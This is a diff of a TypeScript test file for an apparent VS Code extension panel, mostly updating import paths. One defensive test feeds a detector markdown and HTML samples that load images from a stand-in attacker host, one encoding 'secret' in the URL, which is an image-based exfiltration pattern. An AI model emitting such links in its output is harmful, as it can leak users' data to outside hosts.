@@ -6,8 +6,8 @@ import * as fs from 'fs';
 import * as os from 'os';
 import * as path from 'path';
 
-import { BitbucketClient } from '../src/core/bitbucket';
-import type { HealthReport, HostMessage, SettingsData, TranscriptItem } from '../src/core/wire';
+import { BitbucketClient } from '../../core/src/bitbucket';
+import type { HealthReport, HostMessage, SettingsData, TranscriptItem } from '../../core/src/wire';
 
 // panel.ts loads `vscode`: the dialogs a test answers, nothing else.
 /* eslint-disable @typescript-eslint/no-require-imports */
@@ -99,7 +99,7 @@ test('panel: a folder without library.yaml becomes a library once you say so', a
 });
 
 test('panel: a report that would load images from the web is opened as text, not in the preview', async () => {
-  const { loadsRemote } = await import('../src/core/view');
+  const { loadsRemote } = await import('../../core/src/view');
   for (const md of ['![x](https://evil.example/?q=c2VjcmV0)', '![](//evil.example/a.png)', '<img src="https://evil.example/p">', '<img alt=x src=http://evil.example/p>', '![logo][l]\n\n[l]: https://evil.example/l.png', '<video poster="https://evil.example/p">']) {
     assert.equal(loadsRemote(md), true, md);
   }
@@ -129,8 +129,8 @@ test('panel: the page gets the streamed output of the task it shows, and of no o
 test('panel: Continue in terminal runs Claude itself, so no shell reads a path with spaces', async () => {
   const opened: Record<string, unknown>[] = [];
   vscodeStub.window.createTerminal = (options: Record<string, unknown>) => (opened.push(options), { show() {} });
-  const { setShim } = await import('../src/core/git');
-  const viewModule = require('../src/core/view') as { detail: unknown };
+  const { setShim } = await import('../../core/src/git');
+  const viewModule = require('../../core/src/view') as { detail: unknown };
   const detail = viewModule.detail;
   const session = '0b7e1d7c-3f0e-4a8e-9d2b-5c1f6a7e8d90';
   viewModule.detail = async () => ({ steps: [{ key: 'k', agent: 'developer', repo: 'api', sessionId: session, configDir: 'C:\\Users\\me\\.claude-work' }] });
@@ -158,7 +158,7 @@ test('panel: Fix in chat opens Claude in the repo of the failure, with it as the
   vscodeStub.window.createTerminal = (options: Record<string, unknown>) => (opened.push(options), { show() {} });
   const ws = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'cs-fix-ws-')));
   for (const r of ['api', 'web']) fs.mkdirSync(path.join(ws, r));
-  const viewModule = require('../src/core/view') as { detail: unknown };
+  const viewModule = require('../../core/src/view') as { detail: unknown };
   const detail = viewModule.detail;
   const lint = 'api: src/a.ts\n  12:3  warning  More than two parameters';
   let shown: { status: { key: string }; error: unknown } = { status: { key: 'waiting' }, error: null };
@@ -212,7 +212,7 @@ test('panel: Fix in chat opens Claude in the repo of the failure, with it as the
 });
 
 test('panel: the task screen says where its failure has a Fix in chat', async () => {
-  const viewModule = require('../src/core/view') as { detail: unknown };
+  const viewModule = require('../../core/src/view') as { detail: unknown };
   const detail = viewModule.detail;
   let shown: { status: { key: string }; error: unknown } = { status: { key: 'waiting' }, error: null };
   viewModule.detail = async () => shown;
